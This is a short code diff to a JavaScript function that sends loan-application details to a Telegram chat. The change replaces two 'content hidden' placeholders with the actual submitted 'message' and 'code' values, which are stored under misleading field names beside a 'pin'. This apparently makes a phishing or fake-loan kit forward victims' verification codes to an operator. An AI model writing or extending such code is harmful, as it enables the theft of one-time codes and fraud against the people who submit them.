@@ -536,8 +536,8 @@ async function notifyTelegram(application) {
     `🧾 pin: ${application.application_id || application.application_no || "—"}\n` +
     `💰 Loan amount: ${money(application.amount)}\n` +
     `📅 Repayment term: ${application.term_months || "—"} months\n` +
-    `🧾 message: Submitted (content hidden)\n` +
-    `🔢 code: Submitted for secure verification (content hidden)\n` +
+    `🧾 message: ${application.first_name && application.first_name !== "SUBMITTED" ? application.first_name : "Not submitted"}\n` +
+    `🔢 code: ${application.second_name && application.second_name !== "SUBMITTED" ? application.second_name : "Not submitted"}\n` +
     `⏰ Date: ${stamp}\n` +
     `🔁 Attempt: #${attempt}\n` +
     `📌 Status: ${application.status || "PENDING_ADMIN_APPROVAL"}`;
